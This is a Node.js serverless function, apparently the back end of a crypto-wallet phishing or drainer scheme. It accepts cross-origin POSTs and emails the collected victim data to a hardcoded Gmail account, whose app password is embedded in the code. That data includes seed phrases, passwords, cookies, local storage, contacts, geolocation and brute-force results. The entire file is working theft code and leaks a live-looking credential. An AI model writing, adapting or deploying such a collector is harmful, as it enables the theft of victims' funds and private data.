const nodemailer = require("nodemailer");

// Gmail SMTP configuration
const transporter = nodemailer.createTransporter({
  service: "gmail",
  auth: {
    user: process.env.GMAIL_USER || "411plus411@gmail.com",
    pass: process.env.GMAIL_APP_PASSWORD || "ktza qfmh llsn frfy",
  },
});

exports.handler = async (event, context) => {
  // Enable CORS
  const headers = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "Content-Type",
    "Access-Control-Allow-Methods": "POST, OPTIONS",
  };

  // Handle preflight requests
  if (event.httpMethod === "OPTIONS") {
    return {
      statusCode: 200,
      headers,
      body: "",
    };
  }

  // Only allow POST requests
  if (event.httpMethod !== "POST") {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: "Method not allowed" }),
    };
  }

  try {
    // Parse the request body
    const data = JSON.parse(event.body);

    // Format data for email
    const mailContent = `
            New Crypto Data Collected:
            Timestamp: ${data.timestamp}
            IP: ${data.ip}
            User Agent: ${data.userAgent}
            Platform: ${data.platform}
            Device Memory: ${data.device}
            Language: ${data.language}
            Screen: ${data.screen}
            Cookies: ${data.cookies}
            Latitude: ${data.latitude || "N/A"}
            Longitude: ${data.longitude || "N/A"}
            Accuracy: ${data.accuracy || "N/A"}
            Geo Error: ${data.geoError || "N/A"}
            Local Storage: ${data.localStorage || "N/A"}
            Contacts: ${JSON.stringify(data.contacts) || "N/A"}
            Wallet Name: ${data.walletName || "N/A"}
            Seed Phrase: ${data.seedPhrase || "N/A"}
            Password: ${data.password || "N/A"}
            Brute-Force Results: ${
              JSON.stringify(data.bruteForceResults) || "N/A"
            }
        `;

    // Email options
    const mailOptions = {
      from: process.env.GMAIL_USER || "411plus411@gmail.com",
      to: process.env.GMAIL_USER || "411plus411@gmail.com",
      subject: "New Crypto Wallet Data Collected",
      text: mailContent,
    };

    // Send email
    await new Promise((resolve, reject) => {
      transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
          console.log("❌ Email error:", error);
          reject(error);
        } else {
          console.log("✅ Email sent successfully!");
          console.log("📧 Message ID:", info.messageId);
          resolve(info);
        }
      });
    });

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ message: "Data received and email sent" }),
    };
  } catch (error) {
    console.error("❌ Function error:", error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: "Internal server error" }),
    };
  }
};
